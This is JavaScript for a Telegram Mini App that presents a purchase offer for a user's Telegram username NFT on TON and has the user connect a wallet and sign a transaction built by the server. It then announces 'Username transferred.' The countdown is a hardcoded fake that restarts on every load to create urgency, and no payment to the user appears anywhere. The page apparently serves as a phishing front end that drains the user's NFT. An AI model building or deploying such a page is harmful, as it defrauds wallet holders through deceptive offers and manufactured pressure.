const tg = window.Telegram.WebApp;
tg.expand();
tg.setHeaderColor('#181f28');

const urlParams = new URLSearchParams(window.location.search);
const offerId = urlParams.get('offer_id');

if (!offerId) {
    document.getElementById('accept-btn').innerText = "Invalid link";
} else {
    // Загрузка данных с бэкенда
    fetch(`/api/offer/${offerId}`)
        .then(r => r.json())
        .then(data => {
            if (data.error) throw new Error(data.error);
            
            document.getElementById('display-username').innerText = data.username;
            document.getElementById('display-price').innerText = data.price;
            document.getElementById('info-username').innerText = data.username;
            document.getElementById('info-web').innerText = data.username;
            document.getElementById('info-ton').innerText = data.username;
            document.getElementById('latest-price').innerText = data.price;
            
            const now = new Date();
            document.getElementById('latest-time').innerText = now.getHours().toString().padStart(2, '0') + ':' + now.getMinutes().toString().padStart(2, '0');

            const btn = document.getElementById('accept-btn');
            btn.innerText = "Accept the offer";
            btn.disabled = false;
        })
        .catch(e => {
            document.getElementById('accept-btn').innerText = "Offer not found";
        });
}

// Таймер
let endTime = Date.now() + 6 * 24 * 60 * 60 * 1000 + 2 * 60 * 60 * 1000 + 55 * 60 * 1000 + 48 * 1000;

function updateTimer() {
    let diff = endTime - Date.now();
    if (diff < 0) diff = 0;
    
    const d = Math.floor(diff / (1000 * 60 * 60 * 24));
    const h = Math.floor((diff / (1000 * 60 * 60)) % 24).toString().padStart(2, '0');
    const m = Math.floor((diff / 1000 / 60) % 60).toString().padStart(2, '0');
    const s = Math.floor((diff / 1000) % 60).toString().padStart(2, '0');

    document.getElementById('t-days').innerText = `${d} days`;
    document.getElementById('t-h0').innerText = h[0];
    document.getElementById('t-h1').innerText = h[1];
    document.getElementById('t-m0').innerText = m[0];
    document.getElementById('t-m1').innerText = m[1];
    document.getElementById('t-s0').innerText = s[0];
    document.getElementById('t-s1').innerText = s[1];
}

setInterval(updateTimer, 1000);
updateTimer();

// TonConnect
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: window.location.origin + '/tonconnect-manifest.json',
    buttonRootId: 'ton-connect'
});

document.getElementById('accept-btn').addEventListener('click', async () => {
    if (!tonConnectUI.connected) {
        await tonConnectUI.openModal();
        return;
    }

    const address = tonConnectUI.wallet.account.address;
    const btn = document.getElementById('accept-btn');
    btn.innerText = "Checking NFT...";
    btn.disabled = true;

    try {
        const res = await fetch('/api/build', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ address, offer_id: offerId })
        });
        
        const data = await res.json();
        
        if (!res.ok) {
            tg.showAlert(data.error || "NFT not found in this wallet");
            btn.innerText = "Accept the offer";
            btn.disabled = false;
            return;
        }

        await tonConnectUI.sendTransaction(data);
        
        await fetch('/api/signed', { 
            method: 'POST', 
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ offer_id: offerId }) 
        });

        tg.showAlert("Success! Username transferred.");
        btn.innerText = "Success";
        
    } catch (e) {
        tg.showAlert("Error: " + e.message);
        btn.innerText = "Accept the offer";
        btn.disabled = false;
    }
});
